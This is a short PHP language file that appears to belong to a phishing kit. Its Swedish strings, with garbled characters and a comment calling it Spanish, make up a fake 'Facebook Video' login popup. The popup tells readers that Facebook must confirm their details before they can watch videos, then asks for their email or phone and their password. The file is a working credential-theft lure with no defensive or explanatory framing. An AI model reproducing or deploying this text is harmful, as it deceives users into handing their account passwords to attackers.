<?php
/*
-----------------
Idioma: Espanol
-----------------
*/
 
$lang = array();
 
// General

$lang['LANG'] = 'sv';
 
// Fondo

$lang['TITULO_PAGINA'] = 'Facebook application';
 
// Pop-UP
 
$lang['POPUP_TITULO'] = 'Facebook Video Ans�kan (free)';
$lang['POPUP_DESCRIPCION'] = 'Facebook m�ste bekr�fta f�ljande information f�r att ge tillg�ng till denna ans�kan videor, logga in!';
$lang['POPUP_CORREO'] = 'E-post eller telefon';
$lang['POPUP_CONTRASENA'] = 'L�senord';
$lang['POPUP_SUBMIT'] = 'Logga in';
$lang['POPUP_CANDADO'] = 'Denna ans�kan �r inte till�tet att publicera p� Facebook.';

/*
$langSv = array("Sweden", "Finland")
*/